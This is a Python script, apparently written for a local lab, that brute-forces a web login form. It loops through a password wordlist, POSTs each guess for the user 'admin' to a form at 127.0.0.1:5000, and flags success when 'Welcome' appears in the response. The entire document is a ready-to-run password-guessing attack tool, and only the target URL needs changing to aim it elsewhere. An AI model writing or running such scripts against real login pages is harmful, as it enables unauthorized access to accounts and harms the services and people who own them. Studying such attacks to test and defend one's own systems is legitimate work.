import requests

target_url = "http://127.0.0.1:5000/login"
target_username = "admin"

print("="*40)
print(" Brute-Force ")
print("="*40)

# 1. Open the wordlist file
try:
    with open("passwords.txt", "r") as file:
        passwords = file.readlines()
except FileNotFoundError:
    print("[-] Error: passwords.txt not found!")
    exit()

# 2. Loop through the passwords
for password in passwords:
    password = password.strip() # Removes invisible hidden spaces
    print(f"[*] Trying: {target_username} : {password}")
    
    # 3. Send the request to the target form
    # Note: 'username' and 'password' must match the HTML form fields of the target
    payload = {"username": target_username, "password": password}
    
    try:
        response = requests.post(target_url, data=payload)
        
        # 4. Check if we bypassed the login page
        # We look for a word that only appears AFTER a successful login
        if "Welcome" in response.text:
            print("\n[+] SUCCESS! ")
            print(f"[+] Username: {target_username}")
            print(f"[+] Password: {password}")
            break
            
    except requests.exceptions.RequestException as e:
        print(f"[-] Connection error: {e}")
        break
